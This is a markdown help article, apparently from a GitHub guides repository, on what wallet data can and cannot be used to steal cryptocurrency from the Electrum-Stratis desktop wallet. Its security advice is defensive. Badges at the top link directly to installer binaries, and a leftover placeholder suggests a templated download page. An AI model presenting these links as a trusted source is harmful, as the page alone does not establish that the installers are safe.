![Electrum-Stratis](assets/banner-article.png)

# What can be stolen from a wallet, and what cannot

<p align="center">Keys and files, never an address</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

Coins can be stolen, and only by someone who obtains the key that controls them. A seed phrase, a private key, an unlocked wallet file or a compromised machine running the wallet are the four routes; everything else - an address, a balance, a transaction history, a screenshot of a receive screen - is public information and gives no one the ability to spend. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| What was exposed | Can funds move? | Why |
|---|---|---|
| Seed phrase | Yes | It derives every key |
| One private key | Only that address's coins | Keys are per address |
| Encrypted wallet file plus password | Yes | The pair is the wallet |
| Encrypted wallet file alone | Not practically | The password is the barrier |
| Address, QR code, balance, history | No | Public by design |
| Screenshot of the app | No, unless it shows a seed | Check what is in frame |

</div>

The line is not "sensitive versus public" but "can this be used to sign?" Anything that can produce a signature is a spending credential; anything that cannot is data.

## Why it happens

A wallet is a key manager, not an account. There is no server holding a balance to be reset, so theft is not a break-in - it is the acquisition of a signing key, followed by a normal transaction that the network cannot distinguish from the owner's own. That is why every theft looks identical on chain: a valid signature, a valid spend, no anomaly.

The four routes differ in effort. A seed phrase handed over in a chat is instant; a private key pasted into a website leaks one address; a wallet file needs its password, which is why a strong one buys time; a compromised machine captures the password or the decrypted keys while the wallet is open. None of them requires breaking cryptography.

No flow in the maintained build, current release on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), asks for the phrase except a restore the user initiates - because the phrase is the whole of the exposure.

## Fix

1. **Identify what actually leaked.** A seed means every address is exposed; a single key means one; a file means the password decides. The response differs, and guessing wastes the window.
2. **Move the funds, do not just change the password.** A new wallet with a fresh seed, then a sweep of the balance. A password change on the old file leaves the exposed key in place.
3. **Do it in that order: new wallet first, then sweep.** Creating the destination before touching the exposed one means no window where the coins sit in a wallet you have stopped trusting.
4. **Check what else the machine knows.** A keylogger that captured a password also captured anything else typed in that session, so treat other accounts on the same machine as exposed too.
5. **Record the transaction IDs.** If the funds leave without you, the IDs and timestamps are the only artifacts an investigation can use.

If nothing has been exposed, the work is preventive: the phrase on paper, offline, never typed except into a restore you started, and never into a page that asked first ([why no Electrum Stratis flow needs a seed](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/why-no-flow-needs-a-seed.md)).

## If that did not work

If the funds are already gone, the remaining steps are documentation and reporting, not recovery. No service can reverse a signed transaction, and anyone claiming otherwise is selling something - the pattern is documented in the scams article.

If only one address was swept and the rest of the wallet is intact, the leaked key was a single key, not the seed. Generate fresh addresses and stop using the exposed one; the seed itself may still be safe, which is worth confirming before replacing the whole wallet.

If a wallet file was copied but had a strong password, the practical risk is lower than a leaked seed, and the response can be measured rather than urgent - but it is still a replacement, because the file's password protects it only until it does not.

## Prevention

- Never type a seed anywhere except a restore you initiated.
- Keep the phrase on paper, offline, in one known place.
- Use a strong password on the wallet file, distinct from every other password.
- Keep the machine clean: updates, no unknown software, no remote-access tools.
- Treat any request for a key or phrase as hostile, whoever makes it.
- Treat any request for a phrase, a key or a wallet file as the whole attack, whoever sends it.

## FAQ

### Can a crypto wallet be hacked?

A wallet's cryptography has not been broken in practice; what gets compromised is the environment - a phishing page, a malicious build, a keylogger, a seed typed into the wrong window. Treat the software as sound and the surroundings as hostile, and the risk drops sharply.

### What information from my wallet is safe to share?

An address, a QR code of it, and a transaction ID. Those are public by design and let someone send to you or verify a payment. A seed, a private key, a wallet file or a password are never safe to share, and no legitimate request exists for them.

### Someone has my seed phrase. What now?

Create a new wallet immediately, write the new phrase on paper, and sweep the entire balance into it. Do not reuse the exposed phrase and do not delay for diagnosis; a seed in someone else's hands is a spend waiting to happen.

### Can a thief take coins with just my address?

No. An address is a destination, not a credential. It reveals that funds exist and where they went, which is why address reuse is a privacy problem, but it cannot authorise a transaction.

<!-- DOWNLOAD-BLOCK -->

A thief with your seed owns the balance; a thief with your wallet file owns a locked box; a thief with your password owns nothing if the seed is elsewhere. That hierarchy explains why backups are split and why a password is not a substitute for one. The practical question is not what can be taken but what a single compromise would expose, and the answer should never be everything.

## Related articles

- [Is Electrum Stratis safe to use?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)
- [Standard, multisig and imported wallets](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md)
- [Where your address lives, and why it never changes](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/where-a-wallet-address-comes-from.md)
- [Crypto recovery scams](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/paid-services-that-promise-funds-back.md)
